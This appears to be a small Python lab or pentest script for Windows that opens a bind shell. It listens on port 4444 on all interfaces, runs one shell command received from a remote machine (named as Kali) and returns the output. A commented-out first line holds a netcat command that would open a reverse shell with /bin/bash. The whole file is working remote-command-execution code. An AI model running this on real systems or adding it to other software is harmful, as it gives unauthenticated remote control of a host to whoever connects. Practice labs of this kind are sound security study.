# import subprocess
# subprocess("netcat 127.0.0.1 4440 -e /bin/bash",shell=True)
import socket
import subprocess
import sys

def python_nc_bridge():
    # If you want to listen for a connection from Kali:
    LISTEN_IP = "0.0.0.0" # Listen on all interfaces
    PORT = 4444

    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Windows is listening on port {PORT}...")
        print("[*] Send a command from Kali using: echo 'ls' | nc <Windows_IP> 4444")

        client_socket, addr = server.accept()
        print(f"[*] Connection received from {addr[0]}")

        # Receive the command from Kali
        command = client_socket.recv(1024).decode().strip()
        print(f"[*] Executing command: {command}")

        # Run the command on the Windows machine
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        
        # Send the result back to Kali
        client_socket.send(output)
        client_socket.close()
        server.close()

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    python_nc_bridge()